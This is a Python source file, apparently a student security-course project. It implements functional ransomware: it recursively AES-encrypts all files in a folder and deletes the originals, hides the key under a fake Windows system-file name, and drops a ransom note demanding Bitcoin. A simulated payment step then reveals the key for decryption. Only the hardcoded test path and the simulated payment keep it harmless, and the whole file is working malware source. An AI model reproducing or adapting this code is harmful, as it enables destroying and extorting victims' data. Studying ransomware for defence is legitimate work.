import os
import base64
import getpass
from pathlib import Path
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

# Constants
KEY_FILE = "ntoskrnl.sys"  # mimics a system file
NOTE_NAME = "README.txt"
EXT = ".enc"


# Helper: generate AES-CTR key + nonce
def generate_key():
    key = os.urandom(32)  # AES-256
    nonce = os.urandom(16)  # 128-bit nonce for CTR
    return key, nonce

def store_key(hidden_dir, key, nonce):
    os.makedirs(hidden_dir, exist_ok=True)
    full_path = os.path.join(hidden_dir, KEY_FILE)
    with open(full_path, "wb") as f:
        f.write(base64.b64encode(key + nonce))
    # Make file hidden and system (Windows only)
    os.system(f'attrib +h +s "{full_path}"')


# Helper: retrieve key
def load_key(base_path):
    try:
        full_path = os.path.join(base_path, KEY_FILE)
        os.system(f'attrib -h "{full_path}"')  # Make file visible again
        with open(full_path, "rb") as f:
            data = f.read().decode()
        os.remove(full_path)  # Delete the key file after loading
        return data
    except FileNotFoundError:
        return None

# Encrypt or decrypt one file
def process_file(filepath, key, nonce, encrypt=True):
    with open(filepath, "rb") as f:
        data = f.read()

    cipher = Cipher(algorithms.AES(key), modes.CTR(nonce), backend=default_backend())
    processor = cipher.encryptor() if encrypt else cipher.decryptor()
    processed_data = processor.update(data) + processor.finalize()

    if encrypt:
        new_path = filepath + EXT
        with open(new_path, "wb") as f:
            f.write(processed_data)
        os.remove(filepath)
    else:
        if filepath.endswith(EXT):
            orig_path = filepath[:-len(EXT)]
            with open(orig_path, "wb") as f:
                f.write(processed_data)
            os.remove(filepath)

# Recursively encrypt/decrypt folder
def walk_and_process(base_path, key, nonce, encrypt=True):
    for root, _, files in os.walk(base_path):
        for name in files:
            full_path = os.path.join(root, name)
            if encrypt and not name.endswith(EXT) and name != KEY_FILE:
                process_file(full_path, key, nonce, True)
            elif not encrypt and name.endswith(EXT):
                process_file(full_path, key, nonce, False)

# Ransom Note
def create_ransom_note(path):
    note_path = os.path.join(path, NOTE_NAME)
    with open(note_path, "w") as f:
        f.write("Your files have been encrypted!\nSend 1 BTC to wallet XYZ to get your key.\n")

def simulate_payment_and_reveal(hidden_dir):
    print("\n💸 Your files are encrypted. Simulate payment to recover them.")
    input("Press Enter to simulate payment...")
    b64_key=load_key(hidden_dir)
    print("\n✅ Payment accepted. Here's your key:")
    print(b64_key)
    return b64_key

# Main function
def main():
    TARGET_FOLDER = r"E:/university/Security/project/Ransomware-Anti-Ransomware/Ransomware/test"
    KEY_STORAGE_FOLDER = r"E:/university/Security/project/Ransomware-Anti-Ransomware/Ransomware/keystorage"

    target_path = Path(TARGET_FOLDER)
    if not target_path.exists():
        print("❌ Target path does not exist.")
        return

    print("🔐 Starting encryption...")
    key, nonce = generate_key()
    store_key(KEY_STORAGE_FOLDER, key, nonce)
    walk_and_process(str(target_path), key, nonce, encrypt=True)
    print("✅ Files encrypted.")

    # Simulate payment and get base64 key
    key_b64 = simulate_payment_and_reveal(KEY_STORAGE_FOLDER)

    # Decryption phase
    print("\n🔓 Starting decryption process...")
    user_input = input("Paste the key you received: ").strip()
    try:
        data = base64.b64decode(user_input)
        key, nonce = data[:32], data[32:]
        walk_and_process(str(target_path), key, nonce, encrypt=False)
        print("✅ Files successfully decrypted.")
    except Exception as e:
        print(f"❌ Decryption failed: {e}")

if __name__ == "__main__":
    main()